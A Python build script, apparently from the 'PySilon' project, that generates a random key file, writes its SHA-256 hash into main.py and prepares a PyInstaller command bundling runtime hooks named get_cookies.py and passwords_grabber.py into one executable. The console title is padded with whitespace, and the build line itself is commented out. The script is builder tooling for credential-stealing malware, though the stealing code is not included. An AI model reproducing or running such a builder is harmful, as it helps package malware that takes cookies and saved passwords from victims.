import os
import sys
import hashlib

def get_file_hash(path):
    sha256_hash = hashlib.sha256()
    with open(path,"rb") as f:
        for byte_block in iter(lambda: f.read(16777216),b""):
            sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& python PyInstaller/__main__.py -F ' + '--runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py "main.py" & pause & exit"'

with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
with open('main.py', 'r') as copy_source_code: source_code = copy_source_code.readlines()
with open('main.py', 'w') as edit_source_code:
    for line in source_code:
        if line == 'secret_key = \'\'   # Don\'t touch this line (just leave)\n': edit_source_code.write(line.replace('\'\'', '\'' + get_file_hash('PySilon.key') + '\''))
        else: edit_source_code.write(line)

#os.system(pyinstaller_command)
input('Done')
